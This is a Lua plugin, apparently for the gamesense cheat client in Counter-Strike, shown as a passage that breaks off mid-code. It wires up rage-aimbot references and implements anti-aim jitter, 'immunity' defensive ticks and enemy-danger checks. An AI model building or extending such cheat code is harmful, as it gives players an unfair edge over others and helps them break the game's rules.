-- Holds our libraries and their associated gamesense link.
local libraries = {
    [ "entity" ] = "https://gamesense.pub/forums/viewtopic.php?id=27529",
    [ "clipboard" ] = "https://gamesense.pub/forums/viewtopic.php?id=28678",
    [ "base64" ] = "https://gamesense.pub/forums/viewtopic.php?id=21619",
    [ "http" ] = "https://gamesense.pub/forums/viewtopic.php?id=19253"
}

-- Iterate over our required libraries.
for library, link in pairs( libraries ) do
    -- Use pcall to simulate the function call and catch any errors.
    if not pcall( require, "gamesense/" .. library ) then
        error( "Opulent | Please subscribe to the following library: " .. link )
    end
end



-- We have now ensured we have all the required libraries, so use them as normal.
local vector = require "vector"
local clipboard = require( "gamesense/clipboard" )
local base64 = require( "gamesense/base64" )
local http = require( "gamesense/http" )
local entity_lib = require("gamesense/entity")

-- Holds fundemental functions, variables, etc.
local opulent = {
    conditional_items = { },
    -- Listed of our updates, displayed seperately in console upon loading.
    updates = {
        beta = {
            "30.6.2023: Cant be fucked writing these anymore tbh"
        },
        live = {
            "20.5.2023: Completely overhauled 'Randomize'",
            "20.5.2023: Reworked crosshair indicators",
            "19.5.2023: Ported most features from beta to live",
            "12.5.2023: Updated Update Log."
        }
    }
}



-- Creates a new menu item; shorter syntax and allows us to add utilities like automatic visibility handling.
-- Arguments: ui function, menu item name, visibility conditions, menu group, (optional) further ui arguments i.e. slider min/max.
function opulent.new_menu_item( o_function, name, group, conditions, ... )
    -- Create our menu item and save it to a variable for reference. ("LUA", "B" will dictate where our items spawn)
    local item = o_function( "AA", group ~= nil and group or "Anti-aimbot angles", name, ... )

    -- Is this item using visibility conditions?
    if conditions ~= nil then
        -- Add the item to the conditional items array along with it's conditions for further handling.
        opulent.conditional_items[ item ] = conditions
    end

    -- Now return the new, handled item as the process of creating a normal ui item would.
    return item
end

function opulent.lerp_color( first_color, second_color, factor )
    local new_color = { }
    -- ! Factor should be a float from 0-1
    for i=1, #first_color do
        new_color[ i ] = first_color[ i ] + ( second_color[ i ] - first_color [ i ] ) * factor
    end
    return new_color
end

function opulent.print( ... )
    client.color_log( 165, 170, 255, "Opulent \0" )
    client.color_log( 255, 255, 255, "| ", ... )
end

function opulent.gradient_text( color, color_alt, text )
    -- Create a variable store our final text in and grab our text length.
    local final_text = ""
    local text_len = #text-1

    -- Calculate the increments to achieve a gradient.
    local increments = { }
    for i=1, 4 do
        increments[ i ] = ( color_alt[ i ] - color[ i ] ) / text_len
    end

    -- Now iterate over each character of the text and apply th increment.
    for i=1, text_len+1 do
        final_text = final_text .. string.format( "\a%02x%02x%02x%02x%s", color[ 1 ], color[ 2 ], color[ 3 ], color[ 4 ], text:sub( i, i ) )

        for i=1, 4 do
            color[ i ] = color[ i ] + increments[ i ]
        end
    end

    -- Finally, return our new text.
    return final_text
end


function opulent.alt_gradient_text(r1, g1, b1, a1, r2, g2, b2, a2, m)
    local output = ''
    local len = #m
    local rinc = (r2 - r1) / len
    local ginc = (g2 - g1) / len
    local binc = (b2 - b1) / len
    local ainc = (a2 - a1) / len

    for i=1, len do
        output = output .. ('\a%02x%02x%02x%02x%s'):format(r1, g1, b1, a1, m:sub(i, i))
        r1 = r1 + rinc
        g1 = g1 + ginc
        b1 = b1 + binc
        a1 = a1 + ainc
    end
    return output
end

local animate = (function()
    local anim = {}

    local lerp = function(start, vend)
        return start + (vend - start) * (globals.frametime() * 6)
    end

    local lerp_notify = function(start, vend)
        return start + (vend - start) * (globals.frametime() * 8)
    end

    anim.new_notify = function(value, startpos, endpos, condition)
        if condition ~= nil then
            if condition then
                return lerp_notify(value,startpos)
            else
                return lerp_notify(value,endpos)
            end
        else
            return lerp_notify(value,startpos)
        end
    end

    anim.new = function(value, startpos, endpos, condition)
        if condition ~= nil then
            if condition then
                return lerp(value,startpos)
            else
                return lerp(value,endpos)
            end
        else
            return lerp(value,startpos)
        end
    end

    anim.color_lerp = function(color, color2, end_value, condition)
        if condition ~= nil then
            if condition then
                color.r = lerp(color.r,color2.r)
                color.g = lerp(color.g,color2.g)
                color.b = lerp(color.b,color2.b)
                color.a = lerp(color.a,color2.a)
            else
                color.r = lerp(color.r,end_value.r)
                color.g = lerp(color.g,end_value.g)
                color.b = lerp(color.b,end_value.b)
                color.a = lerp(color.a,end_value.a)
            end
        else
            color.r = lerp(color.r,color2.r)
            color.g = lerp(color.g,color2.g)
            color.b = lerp(color.b,color2.b)
            color.a = lerp(color.a,color2.a)
        end
        return { r = color.r , g = color.g , b = color.b , a = color.a }
    end

    anim.adapting = function(cur, min, max, target, step, speed)
        local step = step or 1
        local speed = speed or 0.1

        if cur < min + step then
            target = max
        elseif cur > max - step then
            target = min
        end
        return cur + (target - cur) * speed * (globals.absoluteframetime() * 10)
    end
    return anim
end)()

local function includes( table, key )
    -- Iterate over the table.
    for i=1, #table do
        -- Does this member contain the key?
        if table[ i ] == key then
            return true
        end
    end

    -- No key match found, return false.
    return false
end

-- Convert time to in-game ticks.
local function time_to_ticks( t )
    return math.floor( 0.5 + ( t / globals.tickinterval( ) ) )
end

-- Convert in-game ticks to time.
local function ticks_to_time( t )
    return globals.tickinterval( ) * t
end

-- Convert an rgb color to hex code.
local function rgb_to_hex( r, g, b, a )
    return string.format( "%02x%02x%02x%02x", r or 255, g or 255, b or 255, a or 255 )
end

-- Get the length of a 3d vector.
local function length( position )
    return math.abs( position[ 1 ] ) + math.abs( position[ 2 ] ) + math.abs( position[ 3 ] )
end

-- Get the squared length of a 3d vector.
local function length_sqr( position )
    return math.abs( ( position[ 1 ] * position[ 1 ] ) + ( position[ 2 ] * position[ 2 ] ) + ( position[ 3 ] * position[ 3 ] ) )
end

-- Return a vector of the second vector subtracted by the first.
local function vector_diff( vector_1, vector_2 )
    local new_vector = { }
    for i=1, #vector_1 do
        new_vector[ i ] = vector_1[ i ] - vector_2[ i ]
    end
    return new_vector
end

local function map(n, start, stop, new_start, new_stop)
    local value = (n - start) / (stop - start) * (new_stop - new_start) + new_start
    return new_start < new_stop and math.max(math.min(value, new_stop), new_start) or math.max(math.min(value, new_start), new_stop)
end

-- Ty ally/kay :)
local function KaysFunction(A,B,C)
    local d = (A-B) / A:dist(B)
    local v = C - B
    local t = v:dot(d) 
    local P = B + d:scaled(t)
    
    return P:dist(C)
end

local function GetClosestPoint(A, B, P) -- Function to find the closest point on the line segment AB to the point P (rave1337 (UNBAN!!!))
    local a_to_p = { P[1] - A[1], P[2] - A[2] } -- Vector from point A to point P
    local a_to_b = { B[1] - A[1], B[2] - A[2] } -- Vector from point A to point B

    local atb2 = a_to_b[1]^2 + a_to_b[2]^2 -- Squared length of the vector a_to_b (A to B)

    local atp_dot_atb = a_to_p[1]*a_to_b[1] + a_to_p[2]*a_to_b[2] -- Dot product of vectors a_to_p and a_to_b
    local t = atp_dot_atb / atb2 -- Calculate the parameter t to find the position on the line segment AB

    return { A[1] + a_to_b[1]*t, A[2] + a_to_b[2]*t } -- Calculate the closest point on the line segment AB to point P using parameter t
end

-- Our menu item references.
local references = {
    min_damage = ui.reference( "RAGE", "Aimbot", "Minimum damage" ),
    min_damage_override = { ui.reference( "RAGE", "Aimbot", "Minimum damage override" ) },
    double_tap = { ui.reference( "RAGE", "Aimbot", "Double tap" ) },
    quick_peek = { ui.reference( "RAGE", "Other", "Quick peek assist" ) },
    fake_duck = ui.reference( "RAGE", "Other", "Duck peek assist" ),
    anti_aim = ui.reference( "AA", "Anti-aimbot angles", "Enabled" ),
    pitch = { ui.reference( "AA", "Anti-aimbot angles", "Pitch" ) },
    yaw_base = ui.reference( "AA", "Anti-aimbot angles", "Yaw base" ),
    yaw = { ui.reference( "AA", "Anti-aimbot angles", "Yaw" ) },
    yaw_jitter = { ui.reference( "AA", "Anti-aimbot angles", "Yaw jitter" ) },
    body_yaw = { ui.reference( "AA", "Anti-aimbot angles", "Body yaw" ) },
    freestanding_body_yaw = ui.reference( "AA", "Anti-aimbot angles", "Freestanding body yaw" ),
    edge_yaw = ui.reference( "AA", "Anti-aimbot angles", "Edge yaw" ),
    freestanding = { ui.reference( "AA", "Anti-aimbot angles", "Freestanding" ) },
    roll = ui.reference( "AA", "Anti-aimbot angles", "Roll" ),
    fake_lag = { ui.reference( "AA", "Fake lag", "Enabled" ) },
    fake_lag_amount = ui.reference( "AA", "Fake lag", "Amount" ),
    fake_lag_variance = ui.reference( "AA", "Fake lag", "Variance" ),
    fake_lag_limit = ui.reference( "AA", "Fake lag", "Limit" ),
    leg_movement = ui.reference( "AA", "Other", "Leg movement" ),
    slow_motion = { ui.reference( "AA", "Other", "Slow motion" ) },
    on_shot = { ui.reference( "AA", "Other", "On shot anti-aim" ) },
    player_list = ui.reference( "PLAYERS", "Players", "Player list" ),
    sv_maxusrcmdprocessticks = ui.reference("misc", "settings", "sv_maxusrcmdprocessticks2"),
    force_baim = ui.reference( "RAGE", "Aimbot", "Force body aim" ),
    force_safepoint = ui.reference( "RAGE", "Aimbot", "Force safe point" )
}

-- Holds all of our anti-aim related functions and variables.
local anti_aim = {
    -- The custom states that will be used to determine our anti-aim.
    states = { "Default", "Safe", "Standing", "Running", "Full-speed", "Ducking", "In air", "Air duck", "High ground", "Low ground", "Slow motion" },
    -- Our current anti-aim state.
    state = 1,
    -- Our current anti-aim state's text.
    current_state = "Default",
    -- The string of our current anti-aim stage.
    stage = "Regular",
    -- Whether or not we're able to be backstabbed.
    backstab = false,
    -- Our ping threshold before safety triggers.
    ping_threshold = 0,
    -- The maximum ping before safety is triggered.
    max_ping_threshold = 25,
    -- Do we want to force freestanding?
    force_freestanding = false,
    -- Do we want to force edge yaw?
    force_edge_yaw = false,
    -- Our last valid previous simulation time; used for defensive.
    old_simtime = 0,
    -- An array that holds our previous latencies.
    latency_list = { },
    -- Are we in defensive?
    in_defensive = false,
    -- The duration of the last defensive trigger.
    defensive_duration = 0,
    -- Is the user attempting to choke?
    attempting_choke = false,
    -- The last time we forced defensive.
    last_force_defensive = 0,
    -- Like above, dictates whether we should force immunity.
    force_immunity = false,
    -- Decides our fake lag choke limit.
    choke_limit = 1,
    -- Our list of local player origins.
    origin_list = { },
    -- The array that holds our player indexes and their safety condition.
    safe = { },
    last_in_air = 0,
    delay = 0,
    miss_counter_round = 0,
    miss_counter_game = 0,
    local_damaged = false,
    head_hitbox = {0, 0, 0},
    flutter_amount = 0,
    contortion_amount = 0,
    jitter_value = 0,
    body_yaw = "d",
    --standing_height = 1
}



-- Our menu items. The reason we're defining the array first serves both an aesthetic and practical purpose, to use
-- menu items in our visibility conditions they need to already be defined thus creating them all in the same
-- array which will initialize them at the same time won't work and any 'fix' would be ghetto.. also this looks nice.
local items = { }

-- Format: new_menu_item( desired ui function, item name, (optional) group, (optional) visibility conditions, (optional) item arguments )
-- Visibility conditions format example: { { anti_aim, true }, { anti_aim_type, "jitter" }, { jitter_strength, 50 } }
-- This will make the item visible if anti aim is true, the anti aim type is jitter and the jitter strength is 50.
items.master_switch = opulent.new_menu_item( ui.new_checkbox, "\n" )
items.master_switch_label = opulent.new_menu_item( ui.new_label, "Opulent" )


items.tab = opulent.new_menu_item(ui.new_combobox, "Tab", "Fake lag", {{items.master_switch, true}}, "rage", "anti-aim", "visuals", "misc")

-- misc settings
items.debug_panel = opulent.new_menu_item( ui.new_checkbox, "Debug panel", nil, {{items.tab, "misc"}})
items.debug_logs = opulent.new_menu_item( ui.new_checkbox, "Debug logs", nil, {{items.tab, "misc"}} )
items.clan_tag = opulent.new_menu_item( ui.new_checkbox, "Clan tag", nil, {{items.tab, "misc"}} )
items.safe_knife = opulent.new_menu_item(ui.new_checkbox, "Safe knife", nil, { {items.tab, "misc"}})
items.safe_knife_options = opulent.new_menu_item(ui.new_combobox, "Safe knife options", nil, {{items.safe_knife, true}, {items.tab, "misc"}}, "Visible", "Always")

-- anti-aim settings
items.anti_aim = opulent.new_menu_item( ui.new_checkbox, "Anti-aim", nil, {{items.tab, "anti-aim"}} )
items.anti_aim_options = opulent.new_menu_item( ui.new_multiselect, "Anti-aim options", nil, { { items.anti_aim, true }, { items.tab, "anti-aim" } }, "Optimize leg movement","Break leg movement",  "Anti-backstab", "Desync on use", "Prevent harmful fakelag", "Immunity flick", "Edge yaw" )
items.twist_in_air = opulent.new_menu_item( ui.new_checkbox, "Twist in air", nil, { { items.anti_aim, true }, { items.tab, "anti-aim" }} )
items.twist_in_air_type = opulent.new_menu_item( ui.new_combobox, "Twist mode", nil, { { items.anti_aim, true }, { items.twist_in_air, true }, { items.tab, "anti-aim" } }, "Spin", "Avoidance" )
items.freestanding = opulent.new_menu_item( ui.new_checkbox, "Freestanding", nil, { { items.anti_aim, true }, { items.tab, "anti-aim" } } )
items.freestand_key = opulent.new_menu_item( ui.new_hotkey, "Freestanding key", nil, { { items.anti_aim, true }, { items.tab, "anti-aim" } }, true )
items.freestanding_options = opulent.new_menu_item(ui.new_combobox, "Freestanding options", nil, { { items.anti_aim, true }, { items.freestanding, true }, { items.tab, "anti-aim" } }, "Default", "Jitter", "Static")
items.anti_aim_state_label = opulent.new_menu_item( ui.new_label, "------------------------------------------------", nil, { { items.anti_aim, true, }, { items.tab, "anti-aim" } } )
items.anti_aim_state = opulent.new_menu_item( ui.new_combobox, "Custom state", nil, { { items.anti_aim, true, }, { items.tab, "anti-aim" } }, table.unpack( anti_aim.states ) )

-- Visuals
items.visuals_label = opulent.new_menu_item( ui.new_label, "Visuals", nil, { { items.tab, "visuals" } } )
items.animations = opulent.new_menu_item(ui.new_combobox, "Animations", nil, { { items.tab, "visuals" } }, "Off", "Skydive mode", "Funny legs", "Funny legs always")
-- indicators
items.indicator_enable = opulent.new_menu_item( ui.new_combobox, "Display crosshair indicators", nil, { { items.tab, "visuals" } }, "None", "Default", "Modern" )
items.main_color_label = opulent.new_menu_item( ui.new_label, "Main color", nil, { { items.tab, "visuals" }, {items.indicator_enable, "Modern" } } )
items.main_color = opulent.new_menu_item( ui.new_color_picker, "Main color", nil, { { items.tab, "visuals" }, {items.indicator_enable, "Modern" } }, 255, 255, 255, 255 )
items.second_color_label = opulent.new_menu_item( ui.new_label, "Second color", nil, { { items.tab, "visuals" }, {items.indicator_enable, "Modern" } } )
items.second_color = opulent.new_menu_item( ui.new_color_picker, "Second color", nil, { { items.tab, "visuals" }, {items.indicator_enable, "Modern" } }, 255, 255, 255, 255 )
items.default_colors = opulent.new_menu_item( ui.new_color_picker, "Default color", nil, { { items.tab, "visuals" }, {items.indicator_enable, "Modern" } }, 255, 255, 255, 255 )


items.safety_flag = opulent.new_menu_item( ui.new_checkbox, "Display safety flag", nil, { { items.tab, "visuals" } } )

items.fake_lag_label = opulent.new_menu_item( ui.new_label, "Fake lag info", "Fake lag", { { items.anti_aim, true } } )
items.fake_lag_label_info = opulent.new_menu_item( ui.new_label, "choke: 0 | force: 0", "Fake lag", { { items.anti_aim, true } } )

-- rage settings
items.ideal_tick = opulent.new_menu_item( ui.new_checkbox, "Ideal tick", nil, {{items.tab, "rage"}} )
items.ideal_tick_key = opulent.new_menu_item( ui.new_hotkey, "Ideal tick key", nil, {{items.tab, "rage"}}, true )
items.ideal_tick_options = opulent.new_menu_item( ui.new_multiselect, "Ideal tick options", nil, { { items.tab, "rage" }, { items.ideal_tick, true } }, "Freestanding", "Immunity" )
items.double_tap_restore = opulent.new_menu_item( ui.new_combobox, "Double tap restore", nil, { {items.tab, "rage"}, { items.ideal_tick, true } }, "Always on", "On hotkey", "Toggle", "Off hotkey" )
items.quick_peek_restore = opulent.new_menu_item( ui.new_combobox, "Quick peek restore", nil, { { items.tab, "rage" }, { items.ideal_tick, true } }, "Always on", "On hotkey", "Toggle", "Off hotkey" )

-- Now, we have to handle the anti-aim menu items; we'll start by predefining these arrays as to not access nil members.
items.state_enabled = { }
items.anti_aim_type = { }
items.yaw_offset = { }
items.force_immunity = { }
items.safety_triggers = { }
items.danger_threshold = { }

items.contortion_modifers_label = {  }
items.contortion_modifers_breaker = {  }
items.jitter_type = { }
items.jitter_body_yaw = {}
items.jitter_strength = { }
items.prevent_logging = { }
items.contortion_strength = { }
items.flutter = { }
items.flutter_strength = { }
items.contortion_body_yaw = { }

items.prevent_prediction = { }
items.randomize_contortion = { }
items.jitter_contort = {  }
items.jitter_contort_strength = { }
items.jitter_contort_bodyyaw = { }
items.jitter_contort_type = { }

items.delay_swap = { }
items.l_yaw_offset = { }
items.r_yaw_offset = { }
-- Iterate over our different anti-aim states.
for i=1, #anti_aim.states do
    -- The mini master switch which decides if we want to use this mode. Must be defined prior to the visibility check.
    items.state_enabled[ i ] = opulent.new_menu_item( ui.new_checkbox, string.format( "[ %s ] Enabled", anti_aim.states[ i ] ), nil, { { items.anti_aim, true }, { items.anti_aim_state, anti_aim.states[ i ] }, { items.tab, "anti-aim" } } )

    -- The visibility check, determines whether or not we want to show all of this state's items.
    local generic_conditions = { { items.state_enabled[ i ], true }, { items.anti_aim, true }, { items.anti_aim_state, anti_aim.states[ i ] }, { items.tab, "anti-aim" } }

    -- List of the state's items.
    items.anti_aim_type[ i ] = opulent.new_menu_item( ui.new_combobox, "Type", nil, generic_conditions, "Jitter", "Contortion" )
    items.safety_triggers[ i ] = opulent.new_menu_item( ui.new_multiselect, "Safety triggers", nil, generic_conditions, "Dangerous enemy", "Unviable anti-aim" )
    items.danger_threshold[ i ] = opulent.new_menu_item( ui.new_slider, "Danger threshold", nil, generic_conditions, 1, 100, 100, true, "%" )
   -- items.yaw_offset[ i ] = opulent.new_menu_item( ui.new_slider, "Yaw offset", nil, generic_conditions, -30, 30, 0, true, "°" )

    -- The visibility conditions for our jitter items.
    local jitter_conditions = { { items.state_enabled[ i ], true }, { items.anti_aim, true }, { items.anti_aim_state, anti_aim.states[ i ] }, { items.anti_aim_type[ i ], "Jitter" }, { items.tab, "anti-aim" } }
    items.jitter_type[ i ] = opulent.new_menu_item( ui.new_combobox, "Jitter type", nil, jitter_conditions, "Default", "Slow" )

    local jitter_strength_conditions = { { items.state_enabled[ i ], true }, { items.anti_aim, true }, { items.tab, "anti-aim" }, { items.anti_aim_state, anti_aim.states[ i ] }, { items.anti_aim_type[ i ], "Jitter" }, { items.jitter_type[ i ], "Default" } }
    local jitter_body_yaw_conditions = { { items.state_enabled[ i ], true }, { items.anti_aim, true }, { items.anti_aim_state, anti_aim.states[ i ] }, { items.anti_aim_type[ i ], "Jitter" }, { items.jitter_type[ i ], "Slow" }, { items.tab, "anti-aim" } }
    items.jitter_body_yaw [i] = opulent.new_menu_item( ui.new_combobox, "Jitter body yaw", nil, jitter_body_yaw_conditions, "Static","Jitter" ,"No Desync" )
    items.jitter_strength[ i ] = opulent.new_menu_item( ui.new_slider, "Jitter strength", nil, jitter_strength_conditions, 1, 100, 50, true, "%" )
    items.prevent_logging[ i ] = opulent.new_menu_item( ui.new_checkbox, "Prevent angle logging", nil, jitter_conditions )
    local jitter_not_default_conditions = { { items.state_enabled[ i ], true }, { items.anti_aim, true }, { items.anti_aim_state, anti_aim.states[ i ] }, { items.anti_aim_type[ i ], "Jitter" }, { items.jitter_type[ i ], "Slow" }, { items.tab, "anti-aim" } }
    items.l_yaw_offset[ i ] = opulent.new_menu_item( ui.new_slider, anti_aim.states[i] .. ' left offset', nil, jitter_not_default_conditions, -180, 180, 0, true, '°' )
    items.r_yaw_offset[ i ] = opulent.new_menu_item( ui.new_slider, anti_aim.states[i] .. ' right offset', nil, jitter_not_default_conditions, -180, 180, 0, true, '°' )
    items.delay_swap[ i ] = opulent.new_menu_item(ui.new_slider, "Delay swap", nil, jitter_not_default_conditions, 2, 10, 2, true, "t", 1)

    -- The visibility conditions for our contortion items.
    local contortion_conditions = { { items.state_enabled[ i ], true }, { items.anti_aim, true }, { items.anti_aim_state, anti_aim.states[ i ] }, { items.anti_aim_type[ i ], "Contortion" }, { items.tab, "anti-aim" } }

    items.contortion_strength[ i ] = opulent.new_menu_item( ui.new_slider, "Contortion strength", nil, contortion_conditions, 1, 100, 50, true, "%" )
    items.contortion_body_yaw[ i ] = opulent.new_menu_item( ui.new_combobox, "Body Yaw", nil, contortion_conditions, "Jitter", "Opposite" )

    items.contortion_modifers_breaker [ i] = opulent.new_menu_item(ui.new_label, "------------------------------------------------", nil, contortion_conditions)
    items.contortion_modifers_label [ i] = opulent.new_menu_item(ui.new_label, "Contortion Modifiers", nil, contortion_conditions)
    items.flutter[ i ] = opulent.new_menu_item( ui.new_checkbox, "Flutter", nil, contortion_conditions )
    items.flutter_strength[i] = opulent.new_menu_item(ui.new_combobox, "Flutter Strength", nil, { { items.state_enabled[i], true }, { items.anti_aim, true }, { items.tab, "anti-aim" }, { items.anti_aim_state, anti_aim.states[i] }, { items.anti_aim_type[i], "Contortion" }, { items.flutter[i], true } }, "Low", "Medium", "High")
    items.prevent_prediction[ i ] = opulent.new_menu_item( ui.new_checkbox, "Prevent contortion prediction", nil, contortion_conditions )
    items.randomize_contortion[ i ] = opulent.new_menu_item( ui.new_checkbox, "Randomize", nil, contortion_conditions )
    
    items.jitter_contort[ i ] = opulent.new_menu_item( ui.new_checkbox, "Jitter Contortion", nil, contortion_conditions )
    items.jitter_contort_bodyyaw[ i ] = opulent.new_menu_item( ui.new_combobox, "Jitter Body Yaw", nil, { { items.state_enabled[i], true }, { items.anti_aim, true }, { items.tab, "anti-aim" }, { items.anti_aim_state, anti_aim.states[i] }, { items.anti_aim_type[i], "Contortion" }, { items.jitter_contort[i], true } }, "Flip Static", "Jitter", "Off" )
    items.jitter_contort_type[ i ] = opulent.new_menu_item( ui.new_combobox, "Jitter Type", nil, { { items.state_enabled[i], true }, { items.anti_aim, true }, { items.tab, "anti-aim" }, { items.anti_aim_state, anti_aim.states[i] }, { items.anti_aim_type[i], "Contortion" }, { items.jitter_contort[i], true } }, "Center", "Offset" )

    items.jitter_contort_strength[ i ] = opulent.new_menu_item( ui.new_slider, "Jitter strength", nil, { { items.state_enabled[i], true }, { items.anti_aim, true }, { items.tab, "anti-aim" }, { items.anti_aim_state, anti_aim.states[i] }, { items.anti_aim_type[i], "Contortion" }, { items.jitter_contort[i], true } }, 1, 100, 50, true, "%" )
    


    items.force_immunity[ i ] = opulent.new_menu_item( ui.new_checkbox, string.format( "Force immunity on %s", anti_aim.states[ i ]:lower( ) ), nil, generic_conditions )
end

-- Array to hold all of our ideal tick info.
local ideal_tick = {
    previous_weapon = nil,
    active = false,
    should_reset = false,
    last_restore_type = { "", "" }
}

function ideal_tick.run( cmd )
    -- Reset our activity variable to false.
    ideal_tick.active = false

    -- We don't want to run this is we aren't using the anti-aim.
    if not ui.get( items.anti_aim ) then
        return
    end

    local quick_peek_restore = ui.get( items.quick_peek_restore )
    local double_tap_restore = ui.get( items.double_tap_restore )

    -- Return if ideal tick isn't enabled via both the checkbox and keybind.
    if not ui.get( items.ideal_tick ) or not ui.get( items.ideal_tick_key ) then
        if ui.get( items.ideal_tick ) then
            if ideal_tick.last_restore_type[ 1 ] ~= quick_peek_restore or ideal_tick.last_restore_type[ 2 ] ~= double_tap_restore then
                ui.set( references.quick_peek[ 2 ], ui.get( items.quick_peek_restore ) )
                ui.set( references.double_tap[ 2 ], ui.get( items.double_tap_restore ) )
                last_restore_type = { quick_peek_restore, double_tap_restore }
            end
        end
        
        -- We have a valid original keybind mode available, so use it.
        if ideal_tick.should_reset then
            -- Set the user's keybind modes back to their original values.
            ui.set( references.quick_peek[ 2 ], ui.get( items.quick_peek_restore ) )
            ui.set( references.double_tap[ 2 ], ui.get( items.double_tap_restore ) )
            ideal_tick.should_reset = false
        end
        return
    end

    -- No matter what, we want quick peek and double tap active.
    ui.set( references.quick_peek[ 2 ], "Always on" )
    ui.set( references.double_tap[ 2 ], "Always on" )

    -- Let the lua know we want to force freestanding.
    if includes( ui.get( items.ideal_tick_options ), "Freestanding" ) then
        anti_aim.force_freestanding = true
    end

    -- Simply force defensive if the user desires it.
    if includes( ui.get( items.ideal_tick_options ), "Immunity" ) then
        anti_aim.force_immunity = true
    end

    -- Set our activity variable to true.
    ideal_tick.active = true
    ideal_tick.should_reset = true
end


function doubletap_charged()
        if not ui.get(references.double_tap[1]) or not ui.get(references.double_tap[2])  then
        return false
    end

    if not entity.is_alive(entity.get_local_player()) or entity.get_local_player() == nil then
        return
    end

    local weapon = entity.get_prop(entity.get_local_player(), "m_hActiveWeapon")
    if weapon == nil then
        return false
    end

    local next_attack = entity.get_prop(entity.get_local_player(), "m_flNextAttack") + 0.25
    local next_ready = entity.get_prop(weapon, "m_flNextPrimaryAttack")
    if next_ready == nil then
        return
    end

    local next_primary_attack = next_ready + 0.5
    if next_attack == nil or next_primary_attack == nil then
        return false
    end
    return next_attack - globals.curtime() < 0 and next_primary_attack - globals.curtime() < 0
end


function anti_aim.grab_ping( ent )
    -- Grab our player resource.
    local player_resource = entity.get_all( "CCSPlayerResource" )[ 1 ]
    -- Return the latency prop.
    return entity.get_prop( player_resource, string.format( "%03d", ent ) )
end

function anti_aim.get_fakeduck_latency( ent )
    -- Grab the player's ESP data.
    local esp_data = entity.get_esp_data( ent )
    -- Is this user fakeducking? 9 is the index for the fakeduck flag, 512 means active.
    -- credit: https://gamesense.pub/forums/viewtopic.php?id=34280
    local is_fakeducking = bit.band( esp_data.flags, bit.lshift( 1, 9 ) ) == 512

    -- If the player isn't fakeducking, return 0.
    if not is_fakeducking then
        return 0
    end

    -- Grab our latency, the player's simulation time and curtime.
    local latency = client.latency( ) / 2
    local simtime = entity.get_prop( ent, "m_flSimulationTime" )
    local curtime = globals.curtime( )

    -- The current time subtracted by the enemy's simulation time will give us their
    -- choke; add our latency onto this to account for the delayed data we're receiving.
    local shot_delay = latency + curtime - simtime
    -- Now we have their choke on the server, subtract 14 by it and we have how many
    -- ticks it will take until the enemy hits their maximum choke, or, their shot delay.
    shot_delay = 14 - ( time_to_ticks( shot_delay ) % 14 )

    return ticks_to_time( shot_delay ) * 100
end

function anti_aim.extrapolate( ent, ticks )
    -- Create our local player variables.
    local velocity = { entity.get_prop( ent, "m_vecVelocity" ) }
    local origin = { entity.get_origin( ent ) }
    -- Save the gravity and jump impulse to variables.
    local gravity = cvar.sv_gravity:get_float( )
    local jump_impulse = cvar.sv_jump_impulse:get_float( )
    -- Are we in the air?
    local in_air = bit.band( entity.get_prop( ent, "m_fFlags" ), 1 ) == 0

    -- Re-extrapolate for our desired amount of ticks.
    for i=1, ticks do
        -- Are we in the air?
        if in_air then
            -- Subtract the gravity from our z velocity.
            velocity[ 3 ] = velocity[ 3 ] - ticks_to_time( gravity )
        end

        -- Iterate over our origin (x, y and z).
        for j=1, #origin do
            -- Add our velocity multiplied by the tick interval to the position.
            origin[ j ] = origin[ j ] + velocity[ j ] * globals.tickinterval( )
        end
    end

    -- Return the newly extrapolated position.
    return origin
end

function anti_aim.handle_safety( )
    -- Save the safty triggers to an array for further use.
    local safety_triggers = ui.get( items.safety_triggers[ anti_aim.state ] )
    -- Grab an array with our enemy indexes.
    local enemies = entity.get_players( true )

    -- Iterate over our enemy array.
    for i=1, globals.maxplayers( ) do
        -- Grab our target from the array.
        local target = i

        -- If this entity isn't alive or an enemy, continue.
        if not entity.is_alive( target) or not entity.is_enemy( target ) then
            goto continue
        end

        -- Override this player's value in our safety array with true.
        anti_aim.safe[ target ] = true

        -- Do we have any safety triggers?
        if #safety_triggers > 0 then
            -- Check if the user has selected the "Dangerous enemy" condition.
            if includes( safety_triggers, "Dangerous enemy" ) then
                -- Grab our target's ping.
                local target_ping = anti_aim.grab_ping( target )
                -- Get our danger threshold for this state.
                local danger_threshold = ui.get( items.danger_threshold[ anti_aim.state ] )
                -- Now calculate the user's desired % and save the value; we want a minimum value of 5
                -- so we're also going to subtract 5 from the max and add 5 afterwards.
                anti_aim.ping_threshold = math.floor( ( danger_threshold * ( anti_aim.max_ping_threshold - 5 ) ) / 100 )
                anti_aim.ping_threshold = anti_aim.ping_threshold + 5

                -- Add the target's fakeduck latency to their ping.
                target_ping = target_ping + anti_aim.get_fakeduck_latency( target )

                -- Finally, mark ourselves unsafe if their ping is considered dangerous.
                if target_ping <= anti_aim.ping_threshold then
                    anti_aim.safe[ target ] = false
                end
            end

            -- Check if the user has selected the "Unviable anti-aim" condition.
            if includes( safety_triggers, "Unviable anti-aim" ) then
                -- Are we trying to choke or currently choking more than 2 commands?
                if anti_aim.attempting_choke or globals.chokedcommands( ) > 2 then
                    -- Our anti-aim is unviable, set the target's safety to false.
                    anti_aim.safe[ target ] = false
                end
            end
        end

        ::continue::
    end
end

function anti_aim.handle_state( )
    -- Ensure we have the anti-aim master switch enabled.
    if not ui.get( items.anti_aim ) then
        return
    end

    -- Grab our local player for repeated usage.
    local local_player = entity.get_local_player( )
    -- Grab our current target.
    local target = client.current_threat( )

    -- Grab our velocity then calculate speed.
    local velocity = { entity.get_prop( local_player, "m_vecVelocity" ) }
    local speed = math.sqrt( velocity[ 1 ] ^ 2 + velocity[ 2 ] ^ 2 )
    --print(tostring(speed))
    -- Use bit.band to find out whether or not we're in the air.
    local in_air = bit.band( entity.get_prop( local_player, "m_fFlags" ), 1 ) == 0

    if in_air then
        anti_aim.last_in_air = globals.tickcount( )
    end

    local landing = not in_air and globals.tickcount( ) - anti_aim.last_in_air < 4

    -- Grab our duck amount.
    local duck_amount = entity.get_prop( local_player, "m_flDuckAmount" )
    
    -- Create our z difference variable in the setting scope.
    local enemy_z_difference = 0

    if target ~= nil then
        -- Grab both the target and our own origin's within an array.
        local local_origin = { entity.get_origin( local_player ) }
        local target_origin = { entity.get_origin( target ) }

        -- Calculate the z difference by subtracting the local z axis from the target's.
        enemy_z_difference = local_origin[ 3 ] - target_origin[ 3 ]
    end

    -- Our conditions. The numbers go in the order of the states found in anti_aim.states.
    local conditions = {
        [ 1 ] = true, -- Default
        [ 2 ] = false, -- Safe
        [ 3 ] = speed <= 1.1 and not in_air, -- Standing
